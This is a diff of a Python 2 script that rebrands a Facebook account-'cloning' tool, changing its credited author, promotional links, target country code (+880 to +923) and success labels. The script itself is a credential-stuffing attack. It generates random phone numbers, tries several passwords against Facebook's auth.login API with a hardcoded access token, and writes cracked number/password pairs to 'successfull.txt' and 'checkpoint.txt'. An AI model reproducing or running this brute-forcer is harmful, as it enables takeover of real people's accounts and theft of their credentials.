@@ -1,11 +1,11 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes Sayyed Zakarya
+#The Credit For This Code Goes Jam Shahrukh
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
 os.system('rm -rf .txt')
-for n in range(2000):
+for n in range(1000):
 
     nmbr = random.randint(1111111, 9999999)
     
@@ -202,11 +202,11 @@ def lisensi():
 def login():
 	os.system('clear')
 	print logo
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Fast Cloning Without Fb ID\033[1;92m[New Update]"
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Clone Without Login Fb ID\033[1;92m[New Update]"
         time.sleep(0.1)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m Mr-Robot   WhatsApp Group   "
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m2.\x1b[1;94m Jam   Fcebook Page   "
         time.sleep(0.2)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m3.\x1b[1;91m Mr-Robot   Youtube Channel   "
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m3.\x1b[1;91m Jam   Youtube Channel   "
         time.sleep(0.3)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
 	pilih_login()
@@ -219,10 +219,10 @@ def pilih_login():
         elif peak =="1":
 		Robot()
         elif peak =="2":
-		os.system('xdg-open https://chat.whatsapp.com/C9VZx0EQQJ07TVeW80qgDe')
+		os.system("xdg-open https://m.facebook.com/jam.shahrukh.official")
 	        login()
         elif peak =="3":
-	        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg?sub_confirmation=1')
+	        os.system('xdg-open https://www.youtube.com/channel/UCtiBO4aL6y-W80hjeGZyd7g?sub_confirmation=1')
 	        login()
 	elif peak =="0":
 		keluar()
@@ -246,10 +246,12 @@ def action():
                 print (logo)
 		os.system("clear")
 		print (logo)
-		print("\033[1;94m171, 175, 165, 191, 192, 193, 194, 195, 196, 197, 198, 199")
+		print("\033[1;94m00, 01, 02, 03, 04, 05, 06, 07, 08, 09")
+		print("\033[1;94m10, 11, 12, 13, 14, 15, 16, 17, 18, 19")
+		print("\033[1;94m40, 41, 42, 43, 44, 45, 46, 47, 48, 49")
 		try:
 			c = raw_input("\033[1;95m choose code  : ")
-			k="+880"
+			k="+923"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -286,14 +288,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
+				print '\x1b[1;92m{Queen-Ok}  ' + k + c + user + '  》  ' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass1+'\n'
+					print '\033[1;96m[48Hours] ' + k + c + user + '  》  ' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
 					cps.close()
@@ -303,14 +305,14 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
+ 				        print '\x1b[1;92m{Queen-Ok}  ' + k + c + user + '  》  ' + pass2+'\n'+"\n"
  				        okb = open('save/successfull.txt', 'a')
  				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass2+'\n'
+ 					        print '\033[1;96m[48Hours] ' + k + c + user + '  》  ' + pass2+'\n'
  					        cps = open('save/checkpoint.txt', 'a')
  					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
  					        cps.close()
@@ -320,14 +322,14 @@ def action():
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
- 				                print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
+ 				                print '\x1b[1;92m{Queen-Ok}  ' + k + c + user + '  》  ' + pass3+'\n'+"\n"
  				                okb = open('save/successfull.txt', 'a')
  				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
  				                okb.close()
  				                oks.append(c+user+pass3)
  				            else:
  				                if 'www.facebook.com' in q['error_msg']:
- 					                print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass3+'\n'
+ 					                print '\033[1;96m[48Hours] ' + k + c + user + '  》  ' + pass3+'\n'
  					                cps = open('save/checkpoint.txt', 'a')
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
@@ -337,14 +339,14 @@ def action():
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
- 				                        print '\x1b[1;92m{Hacked}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
+ 				                        print '\x1b[1;92m{Queen-Ok}  ' + k + c + user + '  》  ' + pass4+'\n'+"\n"
  				                        okb = open('save/successfull.txt', 'a')
  				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
  				                    else:
  				                        if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[24Hours] ' + k + c + user + '  》  ' + pass4+'\n'
+ 					                        print '\033[1;96m[48Hours] ' + k + c + user + '  》  ' + pass4+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
  					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
  					                        cps.close()
